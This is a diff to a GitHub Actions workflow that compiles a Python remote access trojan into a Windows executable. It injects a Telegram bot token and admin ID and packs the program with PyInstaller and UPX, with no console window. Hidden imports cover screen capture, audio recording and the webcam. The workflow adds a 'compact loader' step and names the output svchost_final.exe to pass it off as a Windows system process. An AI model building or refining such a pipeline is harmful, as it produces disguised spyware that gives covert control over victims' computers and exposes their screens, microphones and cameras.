@@ -1,4 +1,4 @@
-name: Build Python Rat EXE
+name: Build RAT
 
 on:
   workflow_dispatch:
@@ -33,7 +33,10 @@ jobs:
       - name: Install UPX
         run: choco install upx -y
       
-      - name: Replace token and admin_id in rat.py
+      - name: Install MinGW
+        run: choco install mingw -y
+      
+      - name: Replace token and admin_id
         run: |
           python -c "
           import re
@@ -45,13 +48,17 @@ jobs:
               f.write(content)
           "
       
-      - name: Build EXE (32-bit, без консоли, с UPX)
+      - name: Build RAT EXE
         run: |
-          pyinstaller --onefile --windowed --name "svchost" --target-arch x86 --upx-dir="C:\ProgramData\chocolatey\lib\upx\tools" --hidden-import telegram --hidden-import telegram.ext --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes --hidden-import cv2 --hidden-import numpy --hidden-import GPUtil --hidden-import win10toast --collect-all telegram rat.py
+          pyinstaller --onefile --windowed --name "rat_temp" --target-arch x86 --upx-dir="C:\ProgramData\chocolatey\lib\upx\tools" --hidden-import telegram --hidden-import telegram.ext --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes --hidden-import cv2 --hidden-import numpy --hidden-import GPUtil --hidden-import win10toast --collect-all telegram rat.py
       
-      - name: Upload EXE
+      - name: Build compact loader
+        run: |
+          python loader_builder.py
+      
+      - name: Upload final EXE
         uses: actions/upload-artifact@v4
         with:
-          name: Rat
-          path: dist/*.exe
-          retention-days: 1
+          name: svchost
+          path: dist/svchost_final.exe
+          retention-days: 7
